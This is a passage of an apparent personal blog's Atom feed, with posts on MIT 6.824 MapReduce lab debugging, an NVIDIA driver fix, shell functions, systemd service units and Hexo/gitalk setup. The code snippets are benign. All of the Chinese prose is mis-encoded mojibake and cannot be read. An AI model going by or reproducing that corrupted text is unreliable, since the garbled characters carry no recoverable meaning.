strings.HasPrefix(f.Name(), <span class="string">&quot;mr-worker-jobcount&quot;</span>) &#123;</span><br><span class="line">invocations++</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> strconv.Itoa(invocations)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>åˆ†æè¿™é‡Œçš„ä»£ç å¯çŸ¥ï¼Œæ¯è°ƒç”¨ä¾æ¬¡mapï¼Œå…¨å±€å˜é‡countå°±ä¼š++ï¼Œå¹¶åˆ›å»ºè¯¥workerçš„ç¬¬countä¸ªæ–‡ä»¶<br>åœ¨reduceä¸­æ•°å½“å‰ç›®å½•ä¸‹å‰ç¼€ä¸ºmr-worker-jobcountçš„æ–‡ä»¶ä¸ªæ•°å°±æ˜¯mapçš„ä¸ªæ•°</p></blockquote><p>è°ƒè¯•äº†è‡ªå·±çš„ä»£ç ï¼Œmapåªè°ƒç”¨äº†8æ¬¡ï¼Œreduceåªè°ƒç”¨äº†ä¸€æ¬¡</p><blockquote><p>æ³¨æ„åˆ°jobcountä¸­ä½¿ç”¨äº†goå·²ç»å¼ƒç”¨çš„<code>ioutils</code>åŒ…ï¼Œæ”¹ä¸ºosï¼Œé—®é¢˜è§£å†³</p></blockquote><h3 id="crash-test"><a href="#crash-test" class="headerlink" title="crash test"></a>crash test</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## mimic rpc.go&#x27;s coordinatorSock()</span></span><br><span class="line">SOCKNAME=/var/tmp/824-mr-`<span class="built_in">id</span> -u`</span><br></pre></td></tr></table></figure><p>æµ‹è¯•è„šæœ¬è¦æ¨¡ä»¿Coordinatorçš„Sock</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;h3 id=&quot;å®éªŒç›®çš„&quot;&gt;&lt;a href=&quot;#å®éªŒç›®çš„&quot; class=&quot;headerlink&quot; title=&quot;å®éªŒç›®çš„&quot;&gt;&lt;/a&gt;å®éªŒç›®çš„&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;å®ç°ä¸€ä¸ªMapReduceè°ƒåº¦å™¨(Coordinator)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;å‡†å¤‡å·¥ä½œ&quot;&gt;&lt;a href=&quot;#å‡†å¤‡å·¥ä½œ&quot; class=&quot;headerlink&quot; title=&quot;å‡†å¤‡å·¥ä½œ&quot;&gt;&lt;/a&gt;å‡†å¤‡å·¥ä½œ&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;ä¸‹è½½æºç &lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; git://g.csail.mit.edu/6.824-golabs-2021 6.824&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="OS" scheme="https://jingtianer.github.io/home/categories/OS/"/>
    
    
    <category term="6.824" scheme="https://jingtianer.github.io/home/tags/6-824/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¾å¡é©±åŠ¨è¸©å‘</title>
    <link href="https://jingtianer.github.io/home/2022/10/28/linux/%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8%E8%B8%A9%E5%9D%91/"/>
    <id>https://jingtianer.github.io/home/2022/10/28/linux/%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8%E8%B8%A9%E5%9D%91/</id>
    <published>2022-10-28T09:20:00.000Z</published>
    <updated>2022-11-07T06:44:51.424Z</updated>
    
    <content type="html"><![CDATA[<h2 id="nvidiaæ˜¾å¡é©±åŠ¨è¸©å‘"><a href="#nvidiaæ˜¾å¡é©±åŠ¨è¸©å‘" class="headerlink" title="nvidiaæ˜¾å¡é©±åŠ¨è¸©å‘"></a>nvidiaæ˜¾å¡é©±åŠ¨è¸©å‘</h2><ul><li>ä¹‹å‰æ›´æ–°äº†ä¸€æ¬¡linuxçš„å†…æ ¸ï¼Œå¯¼è‡´å†…æ ¸çš„æ˜¾å¡å†²çªäº†ï¼Œhdmiæ²¡æœ‰è¾“å‡ºï¼Œ<code>nvidia-smi</code>å‘½ä»¤ä¹Ÿæ²¡äº†</li><li>é‡è£…äº†nvidiaçš„æ˜¾å¡ï¼Œå‘ç°é»˜è®¤ä½¿ç”¨æ ¸æ˜¾ï¼ŒåŠ¨ç”»éå¸¸å¡</li><li>åæ¥å±è”½äº†linuxè‡ªå¸¦çš„é©±åŠ¨nouveauï¼Œhdmiç»ˆäºæœ‰è¾“å‡ºäº†ï¼Œæ˜¾å¡é©±åŠ¨çš„daemonä¹Ÿå¯ä»¥ä½¿ç”¨äº†(<code>nvidia-smi</code>è¾“å‡ºæ­£å¸¸)ï¼Œä½†æ˜¯è‡ªå¸¦çš„æ˜¾ç¤ºå™¨å´ä¸èƒ½ç”¨äº†</li></ul><h3 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h3><ul><li><code>/etc/X11/xorg.conf</code>æ–‡ä»¶ä¸çŸ¥é“ä»€ä¹ˆåŸå› å‡ºç°äº†é”™è¯¯ï¼ŒæŠŠè¿™ä¸ªæ–‡ä»¶å†…å®¹æ¸…ç©ºï¼Œå°±å¥½äº†</li><li>é‡å¯åå‘ç°è¿™ä¸ªæ–‡ä»¶é‡Œé¢æœ¬èº«å°±æ²¡ä¸œè¥¿</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;nvidiaæ˜¾å¡é©±åŠ¨è¸©å‘&quot;&gt;&lt;a href=&quot;#nvidiaæ˜¾å¡é©±åŠ¨è¸©å‘&quot; class=&quot;headerlink&quot; title=&quot;nvidiaæ˜¾å¡é©±åŠ¨è¸©å‘&quot;&gt;&lt;/a&gt;nvidiaæ˜¾å¡é©±åŠ¨è¸©å‘&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;ä¹‹å‰æ›´æ–°äº†ä¸€æ¬¡linuxçš„å†…æ ¸ï¼Œå¯¼è‡´å†…æ ¸çš„æ˜¾å¡å†²</summary>
      
    
    
    
    <category term="linux" scheme="https://jingtianer.github.io/home/categories/linux/"/>
    
    
    <category term="linux" scheme="https://jingtianer.github.io/home/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>shellçš„ä½¿ç”¨</title>
    <link href="https://jingtianer.github.io/home/2022/10/27/linux/shell/"/>
    <id>https://jingtianer.github.io/home/2022/10/27/linux/shell/</id>
    <published>2022-10-27T10:05:00.000Z</published>
    <updated>2022-11-07T06:44:51.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="shell-fuction"><a href="#shell-fuction" class="headerlink" title="shell fuction"></a>shell fuction</h2><h3 id="å‡½æ•°å®šä¹‰"><a href="#å‡½æ•°å®šä¹‰" class="headerlink" title="å‡½æ•°å®šä¹‰"></a>å‡½æ•°å®šä¹‰</h3><ul><li>å®šä¹‰1<figure class="highlight sh"><figcaption><span>xxx.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">funcName</span></span>() &#123;</span><br><span class="line">    <span class="comment"># do sth</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>å®šä¹‰2<figure class="highlight sh"><figcaption><span>xxx.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">f2</span></span>() &#123;</span><br><span class="line">    value=$((<span class="variable">$1</span>+<span class="variable">$2</span>+<span class="number">1</span>))</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$1</span> <span class="string">&quot;+&quot;</span> <span class="variable">$2</span> <span class="string">&quot;=&quot;</span> <span class="variable">$value</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="ä¼ å‚"><a href="#ä¼ å‚" class="headerlink" title="ä¼ å‚"></a>ä¼ å‚</h3><figure class="highlight sh"><figcaption><span>xxx.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">funcName</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$1</span> <span class="comment"># æ‰“å°ç¬¬ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$2</span> <span class="comment"># æ‰“å°ç¬¬äºŒä¸ªå‚æ•°</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è°ƒç”¨"><a href="#è°ƒç”¨" class="headerlink" title="è°ƒç”¨"></a>è°ƒç”¨</h3><ul><li>ç›´æ¥åœ¨è„šæœ¬ä¸­è°ƒç”¨</li></ul><figure class="highlight sh"><figcaption><span>xxx.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">funcName</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$1</span> <span class="comment"># æ‰“å°ç¬¬ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$2</span> <span class="comment"># æ‰“å°ç¬¬äºŒä¸ªå‚æ•°</span></span><br><span class="line">&#125;</span><br><span class="line">funcName åˆ˜å–µå–µ å¤§å¸…å“¥</span><br></pre></td></tr></table></figure><ul><li>åœ¨shellä¸­è°ƒç”¨</li></ul><figure class="highlight sh"><figcaption><span>shell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. xxx.sh <span class="comment"># importå¯¼å…¥å…¶ä¸­çš„å‡½æ•°</span></span><br><span class="line">funcName åˆ˜å–µå–µ å¤§å¸…å“¥</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœfunctionå†™åœ¨<code>/etc/profile</code>ã€<code>~/.bashrc</code>ä¸‹ï¼Œåˆ™å¯ä»¥ç›´æ¥è°ƒç”¨</p></blockquote><h3 id="åº”ç”¨"><a href="#åº”ç”¨" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h3><ul><li>æœ‰äº†ä»¥ä¸Šæ–¹æ³•ï¼Œåœ¨bashrcä¸­å°†è‡ªå·±å¸¸ç”¨ä½†å®¹æ˜“é—å¿˜çš„å‘½ä»¤å†™æˆå‡½æ•°ï¼Œå°±å¯ä»¥æ–¹ä¾¿çš„è°ƒç”¨äº†</li><li>å¦‚æœå‡½æ•°å¿˜äº†ï¼Œï¼Œé‚£å°±å¯ä»¥å»<code>~/.bashrc</code>ä¸‹çœ‹çœ‹ğŸ˜…x1</li><li>å¦‚æœå¿˜è®°å»å“ªé‡Œçœ‹äº†ï¼Œï¼Œï¼Œé‚£å°±æ¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« ğŸ˜…x2</li><li>å¦‚æœå¿˜è®°è¿™ç¯‡æ–‡ç« ï¼Œï¼Œï¼Œé‚£æˆ‘ç›´æ¥ğŸ˜…x3</li></ul><figure class="highlight sh"><figcaption><span>~/.bashrc</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">setgitproxy</span></span>() &#123;</span><br><span class="line">    git config --global http.proxy <span class="string">&#x27;socks5h://localhost:7890&#x27;</span></span><br><span class="line">    git config --global https.proxy <span class="string">&#x27;socks5h://localhost:7890&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">unsetgitproxy</span></span>() &#123;</span><br><span class="line">    git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">    git config --global --<span class="built_in">unset</span> https.proxy</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ubuntuä¸­åˆ›å»ºunit"><a href="#ubuntuä¸­åˆ›å»ºunit" class="headerlink" title="ubuntuä¸­åˆ›å»ºunit"></a>ubuntuä¸­åˆ›å»ºunit</h2><h3 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h3><p>systemctl æä¾›äº†ä¸€ç»„å­å‘½ä»¤æ¥ç®¡ç†å•ä¸ªçš„ unitï¼Œå…¶å‘½ä»¤æ ¼å¼ä¸ºï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl [<span class="built_in">command</span>] [unit]</span><br></pre></td></tr></table></figure><h3 id="åˆ›å»ºunit"><a href="#åˆ›å»ºunit" class="headerlink" title="åˆ›å»ºunit"></a>åˆ›å»ºunit</h3><ul><li>ç¼–å†™<code>.service</code>æ–‡ä»¶<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/systemd/system/xxx.service</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight sh"><figcaption><span>xxx.service</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=clash daemon</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">User=root</span><br><span class="line">ExecStart=/opt/xxx/xxx -d /etc/xxx/ <span class="comment">#startæ—¶æ‰§è¡Œçš„å‘½ä»¤</span></span><br><span class="line">Restart=on-failure</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><ul><li><p>é‡æ–°åŠ è½½systemctl daemon</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br></pre></td></tr></table></figure></li><li><p>å¯åŠ¨service</p></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start xxx.service</span><br></pre></td></tr></table></figure><ul><li>è®¾ç½®ä¸ºå¼€æœºå¯åŠ¨</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> xxx.service</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;shell-fuction&quot;&gt;&lt;a href=&quot;#shell-fuction&quot; class=&quot;headerlink&quot; title=&quot;shell fuction&quot;&gt;&lt;/a&gt;shell fuction&lt;/h2&gt;&lt;h3 id=&quot;å‡½æ•°å®šä¹‰&quot;&gt;&lt;a href=&quot;#å‡½æ•°å®šä¹‰&quot; class=&quot;headerlink&quot; title=&quot;å‡½æ•°å®šä¹‰&quot;&gt;&lt;/a&gt;å‡½æ•°å®šä¹‰&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;å®šä¹‰1&lt;figure class=&quot;highlight sh&quot;&gt;&lt;figcaption&gt;&lt;span&gt;xxx.sh&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;funcName&lt;/span&gt;&lt;/span&gt;() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# do sth&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;å®šä¹‰2&lt;figure class=&quot;highlight sh&quot;&gt;&lt;figcaption&gt;&lt;span&gt;xxx.sh&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;f2&lt;/span&gt;&lt;/span&gt;() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    value=$((&lt;span class=&quot;variable&quot;&gt;$1&lt;/span&gt;+&lt;span class=&quot;variable&quot;&gt;$2&lt;/span&gt;+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;+&amp;quot;&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$2&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;=&amp;quot;&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;ä¼ å‚&quot;&gt;&lt;a href=&quot;#ä¼ å‚&quot; class=&quot;headerlink&quot; title=&quot;ä¼ å‚&quot;&gt;&lt;/a&gt;ä¼ å‚&lt;/h3&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;figcaption&gt;&lt;span&gt;xxx.sh&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;funcName&lt;/span&gt;&lt;/span&gt;() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;# æ‰“å°ç¬¬ä¸€ä¸ªå‚æ•°&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$2&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;# æ‰“å°ç¬¬äºŒä¸ªå‚æ•°&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;è°ƒç”¨&quot;&gt;&lt;a href=&quot;#è°ƒç”¨&quot; class=&quot;headerlink&quot; title=&quot;è°ƒç”¨&quot;&gt;&lt;/a&gt;è°ƒç”¨&lt;/h3&gt;</summary>
    
    
    
    <category term="linux" scheme="https://jingtianer.github.io/home/categories/linux/"/>
    
    
    <category term="shell" scheme="https://jingtianer.github.io/home/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>hexoé…ç½®&amp;è¸©å‘&amp;è‡ªå®šä¹‰</title>
    <link href="https://jingtianer.github.io/home/2022/10/26/misc/hexo%E9%85%8D%E7%BD%AE&amp;%E8%B8%A9%E5%9D%91&amp;%E8%87%AA%E5%AE%9A%E4%B9%89/"/>
    <id>https://jingtianer.github.io/home/2022/10/26/misc/hexo%E9%85%8D%E7%BD%AE&amp;%E8%B8%A9%E5%9D%91&amp;%E8%87%AA%E5%AE%9A%E4%B9%89/</id>
    <published>2022-10-26T03:28:00.000Z</published>
    <updated>2022-11-19T08:23:54.623Z</updated>
    
    <content type="html"><![CDATA[<h2 id="git-deplyer"><a href="#git-deplyer" class="headerlink" title="git deplyer"></a>git deplyer</h2><p><a href="https://blog.csdn.net/weixin_43659725/article/details/125207584">ref</a></p><h2 id="æ–‡ç« ç›®å½•"><a href="#æ–‡ç« ç›®å½•" class="headerlink" title="æ–‡ç« ç›®å½•"></a>æ–‡ç« ç›®å½•</h2><ul><li>icarusçš„æ–‡ç« ç›®å½•åªæœ‰äºŒçº§æ ‡é¢˜å¼€å§‹æ‰å¯ä»¥è·³è½¬</li></ul><h2 id="é˜…è¯»æ›´å¤šæŒ‰é’®"><a href="#é˜…è¯»æ›´å¤šæŒ‰é’®" class="headerlink" title="é˜…è¯»æ›´å¤šæŒ‰é’®"></a>é˜…è¯»æ›´å¤šæŒ‰é’®</h2><ul><li>å®‰è£…<a href="https://github.com/chekun/hexo-excerpt">hexo-excerpt</a>æ’ä»¶</li></ul><h2 id="live2d"><a href="#live2d" class="headerlink" title="live2d"></a>live2d</h2><ul><li>å®‰è£…è¿™ä¸ª<a href="https://github.com/EYHN/hexo-helper-live2d">hexo-helper-live2d</a></li></ul><h2 id="ä»£ç å—"><a href="#ä»£ç å—" class="headerlink" title="ä»£ç å—"></a>ä»£ç å—</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock filename lang:code-lang %&#125;</span><br><span class="line">    your code here...</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><h2 id="gittalk"><a href="#gittalk" class="headerlink" title="gittalk"></a>gittalk</h2><ul><li>æŒ‰ç…§æ•™ç¨‹åˆ›å»ºgittalkï¼Œå¡«å†™é…ç½®æ–‡ä»¶</li><li><a href="https://ppoffice.github.io/hexo-theme-icarus/Plugins/Comment/icarus%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97-%E7%94%A8%E6%88%B7%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6/">å®˜æ–¹æ•™ç¨‹</a></li></ul><blockquote><p>æ³¨æ„è¿™é‡Œçš„repoæ˜¯ä»“åº“åå­—ï¼Œä¸æ˜¯repoçš„urlï¼Œä¸æ˜¯repoçš„åç§°</p></blockquote><blockquote><p>é€šè¿‡f12çš„networkå‘ç°å‘é€çš„æ˜¯apiurl+repo</p></blockquote><figure class="highlight yaml"><figcaption><span>_config.icaruc.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">comment:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">gitalk</span></span><br><span class="line">    <span class="attr">client_id:</span> <span class="string">xxxxxxxxxxxxxxxxxxxx</span></span><br><span class="line">    <span class="attr">client_secret:</span> <span class="string">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span></span><br><span class="line">    <span class="attr">repo:</span> <span class="string">Some-of-Your-GitHub-Repo</span> <span class="comment"># è¿™é‡Œæ˜¯repoçš„åå­—ï¼Œä¸æ˜¯url</span></span><br><span class="line">    <span class="attr">owner:</span> <span class="string">you_github_name</span></span><br><span class="line">    <span class="attr">admin:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">you_github_name</span></span><br><span class="line">    <span class="attr">per_page:</span> <span class="number">20</span>                    <span class="comment"># å¯é€‰å¡«</span></span><br><span class="line">    <span class="attr">distraction_free_mode:</span> <span class="literal">false</span>    <span class="comment"># å¯é€‰å¡«</span></span><br><span class="line">    <span class="attr">pager_direction:</span> <span class="string">last</span>           <span class="comment"># å¯é€‰å¡«</span></span><br><span class="line">    <span class="attr">create_issue_manually:</span> <span class="literal">false</span>    <span class="comment"># å¯é€‰å¡«</span></span><br><span class="line">    <span class="attr">proxy:</span>                          <span class="comment"># å¯é€‰å¡«</span></span><br><span class="line">    <span class="attr">flip_move_options:</span>              <span class="comment"># å¯é€‰å¡«</span></span><br><span class="line">    <span class="attr">enable_hotkey:</span> <span class="literal">true</span>             <span class="comment"># å¯é€‰å¡«</span></span><br><span class="line">    <span class="attr">language:</span> <span class="string">zh-CN</span>                 <span class="comment"># å¯é€‰å¡«</span></span><br></pre></td></tr></table></figure><p>åŒæ—¶ï¼Œåœ¨<code>_config.yml</code>ä¸‹é…ç½®gitalk</p><figure class="highlight yaml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">gitalk:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment">#é»˜è®¤çš„æ˜¯falseï¼Œæ²¡æœ‰æ‰“å¼€</span></span><br><span class="line">  <span class="attr">owner:</span> <span class="string">&#x27;github name&#x27;</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">&#x27;repo name&#x27;</span></span><br><span class="line">  <span class="attr">oauth:</span></span><br><span class="line">    <span class="attr">clientId:</span> <span class="string">&#x27;clientId&#x27;</span></span><br><span class="line">    <span class="attr">clientSecret:</span> <span class="string">&#x27;clientSecret&#x27;</span></span><br><span class="line">  <span class="attr">admin:</span> [<span class="string">&#x27;githubname&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="fairyDust-é¼ æ ‡ç‰¹æ•ˆ"><a href="#fairyDust-é¼ æ ‡ç‰¹æ•ˆ" class="headerlink" title="fairyDust é¼ æ ‡ç‰¹æ•ˆ"></a>fairyDust é¼ æ ‡ç‰¹æ•ˆ</h2><p>åœ¨<code>source/js</code>ä¸‹åˆ›å»ºæ–‡ä»¶<code>fairyDustCursor.js</code></p><figure class="highlight js"><figcaption><span>source/js/fairyDustCursor.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 